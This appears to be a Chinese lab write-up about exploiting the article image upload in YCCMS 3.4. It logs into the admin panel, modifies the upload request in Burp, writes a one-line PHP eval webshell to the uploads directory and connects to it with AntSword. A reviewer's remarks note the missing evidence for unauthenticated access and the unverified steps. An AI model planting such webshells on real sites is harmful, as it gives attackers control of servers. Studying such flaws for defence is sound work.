ailx10说：这篇是2024年9月之前写的，后来又改过。看过 LOGO 入口以后，我又去试 YCCMS 文章里的图片上传。路径换了，操作习惯却相似：正常上传抓包，修改请求，再找生成的文件，最后确认能不能被解释。两篇放在一起，正好能比较同一个系统不同功能是不是重复了相似的检查缺口。笔记保存了日期目录和后续访问，不只是再贴一张连接图。回头整理时，我更愿意把它当对照案例，讲清哪部分一样、哪部分换了入口，也少让同一套步骤占满读者的注意力。

---

YCCMS文章图片上传为另一入口，Burp修改重放，落地日期PHP后执行并写第二文件，蚁剑成功，步骤与LOGO例相近。

核查提示：仍需核无认证请求，主要载荷图片待看；与A0393同机制不同路径，重编可并列避免重复教学。 原实验和代码未重新运行，图内细节有待核验。

本文记录 YCCMS 3.4 文章图片上传入口的实验。原步骤从后台登录开始，缺少无认证请求证据，不能直接断言未授权。

（1）登录后台后添加文章并观察图片上传请求。

![](/notes-assets/a5096d3cf6aaa4cd15d8.webp)

（2）这个时候需要burp出场，拦截请求，重放，修改内容

![](/notes-assets/4f0a3c018da375d7508f.webp)

（3）访问上传的php文件路径

```
http://192.168.220.175/uploads/20240907092011553.php
```

![](/notes-assets/44da60ab6caaa34b716c.webp)

（4）基于这个上传的php，再上传一个一句话木马

```
<?php @eval($_POST['x']); ?>
```

![](/notes-assets/3c0557a46b6da4994389.webp)

得到`mazi.php`的路径

```
http://192.168.220.175/uploads/mazi.php
```

（5）蚁剑连接，成功

![](/notes-assets/f1197350d7dbbac4ed5a.webp)

![](/notes-assets/32360d31ea2c94f48688.webp)

并列这两个案例，更容易看见同一类缺陷怎样藏在不同功能里。但认证状态和关键载荷仍得各自核对，不能因为上一处有结果，就替这一处省掉证明。
